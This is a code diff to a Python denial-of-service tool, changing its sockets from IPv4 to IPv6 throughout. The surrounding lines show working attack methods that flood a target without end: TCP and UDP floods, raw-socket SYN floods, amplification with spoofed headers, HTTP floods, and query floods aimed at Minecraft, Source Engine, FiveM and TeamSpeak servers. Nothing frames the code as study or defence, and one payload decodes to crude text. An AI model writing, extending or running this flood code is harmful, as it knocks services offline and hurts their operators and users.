@@ -11,7 +11,7 @@ from os import urandom as randbytes
 from pathlib import Path
 from random import choice as randchoice
 from random import randint
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
+from socket import (AF_INET6, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
@@ -275,7 +275,7 @@ class Layer4(Thread):
             self.SENT_FLOOD()
 
     def open_connection(self,
-                        conn_type=AF_INET,
+                        conn_type=AF_INET6,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
         if self._proxies:
@@ -336,7 +336,7 @@ class Layer4(Thread):
 
     def TCP(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET6, SOCK_STREAM) as s:
             while Tools.send(s, randbytes(1024)):
                 continue
         Tools.safe_close(s)
@@ -346,7 +346,7 @@ class Layer4(Thread):
         ping = Minecraft.data(b'\x00')
 
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET6, SOCK_STREAM) as s:
             while Tools.send(s, handshake):
                 Tools.send(s, ping)
         Tools.safe_close(s)
@@ -354,13 +354,13 @@ class Layer4(Thread):
     def CPS(self) -> None:
         global REQUESTS_SENT
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET6, SOCK_STREAM) as s:
             REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET6, SOCK_STREAM) as s:
             while s.recv(1):
                 continue
         Tools.safe_close(s)
@@ -373,7 +373,7 @@ class Layer4(Thread):
 
     def UDP(self) -> None:
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
+        with suppress(Exception), socket(AF_INET6, SOCK_DGRAM) as s:
             while Tools.sendto(s, randbytes(1024), self._target):
                 continue
         Tools.safe_close(s)
@@ -381,7 +381,7 @@ class Layer4(Thread):
     def SYN(self) -> None:
         payload = self._genrate_syn()
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+        with suppress(Exception), socket(AF_INET6, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, payload, self._target):
                 continue
@@ -390,7 +390,7 @@ class Layer4(Thread):
     def AMP(self) -> None:
         payload = next(self._amp_payloads)
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW,
+        with suppress(Exception), socket(AF_INET6, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, *payload):
@@ -399,7 +399,7 @@ class Layer4(Thread):
 
     def MCBOT(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET6, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         47,
                                                         2,
@@ -421,7 +421,7 @@ class Layer4(Thread):
         global BYTES_SEND, REQUESTS_SENT
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
-        with socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET6, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
@@ -429,7 +429,7 @@ class Layer4(Thread):
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
-        with socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET6, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
@@ -437,7 +437,7 @@ class Layer4(Thread):
     def TS3(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
-        with socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET6, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
@@ -448,7 +448,7 @@ class Layer4(Thread):
                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                    b'\x73')
-        with socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET6, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
@@ -581,9 +581,9 @@ class HttpFlood(Thread):
 
     def open_connection(self) -> socket:
         if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+            sock = randchoice(self._proxies).open_socket(AF_INET6, SOCK_STREAM)
         else:
-            sock = socket(AF_INET, SOCK_STREAM)
+            sock = socket(AF_INET6, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.connect(self._raw_target)
@@ -994,7 +994,7 @@ class ToolsConsole:
     @staticmethod
     def checkRawSocket():
         with suppress(OSError):
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
+            with socket(AF_INET6, SOCK_RAW, IPPROTO_TCP):
                 return True
         return False
 
